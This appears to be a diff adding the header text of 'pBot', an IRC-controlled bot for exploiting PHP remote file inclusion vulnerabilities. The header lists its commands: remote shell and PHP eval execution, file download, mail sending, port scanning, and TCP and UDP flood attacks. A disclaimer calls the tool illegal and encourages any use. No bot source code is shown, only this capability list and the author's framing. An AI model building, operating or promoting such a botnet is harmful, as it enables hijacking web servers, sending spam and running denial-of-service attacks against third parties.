@@ -1,0 +1,37 @@
+##======================================================================##
+# pBot ~ A bot for exploiting PHP remote file inclusion vulnerabilities  #
+# by V.S.                                                                #
+##======================================================================##
+
+
+= COMMANDS ============================================================================
+ .user <password>                                              //login to the bot
+ .logout                                                       //logout of the bot
+ .die                                                          //kill the bot
+ .restart                                                      //restart the bot
+ .mail <to> <from> <subject> <msg>                             //send an email
+ .dns <IP|HOST>                                                //dns lookup
+ .download <URL> <filename>                                    //download a file
+ .exec <cmd>  // uses shell_exec()                             //execute a command
+ .cmd <cmd> // uses popen()                                    //execute a command
+ .info                                                         //get system information
+ .php <php code> // uses eval()                                //execute php code
+ .tcpflood <target> <packets> <packetsize> <port> <delay>      //tcpflood attack
+ .udpflood <target> <packets> <packetsize> <delay>             //udpflood attack
+ .raw <cmd>                                                    //raw IRC command
+ .rndnick                                                      //change nickname
+ .pscan <host> <port>                                          //port scan
+ .ud.server <newhost> <newport> [newpass]                      //change IRC server
+---------------------------------------------------------------------------------------
+
+ 
+= LICENCE ===========================================================
+ Do whatever the fuck you want with this, legitimate or not. Modify
+ it, rewrite it, rename it, I honestly don't give a crap. Just don't
+ bother me if you fuck it up.
+---------------------------------------------------------------------
+
+
+= DISCLAIMER ========================================================
+ This type of application is illegal, but go nuts. What do I care?
+---------------------------------------------------------------------
